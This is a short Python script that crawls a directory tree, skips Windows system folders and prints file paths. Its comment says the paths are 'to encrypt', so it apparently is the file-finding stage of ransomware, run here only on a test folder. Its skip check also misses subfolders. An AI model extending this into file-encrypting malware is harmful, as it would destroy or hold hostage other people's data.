import os
print("crawling...")

dirs_to_skip = ["Program Files (x86)", "Program Files", "Windows"]

# crawl files and return file paths to encrypt
def crawl_files(start_dir):
    for path, dirs, files in os.walk(start_dir):
        if should_skip(path, dirs_to_skip):
            continue
        for name in files:
            print(path + '\\' + name)

# true if this directory should be skipped
def should_skip(path, dirs_to_skip):
    for dir in dirs_to_skip:
        start_index = len(path)-len(dir)
        if(start_index >= 0):
            if path[start_index:] == dir:
                return True
    return False

if __name__ == "__main__":
    crawl_files("./crawler/crawler_test_dir")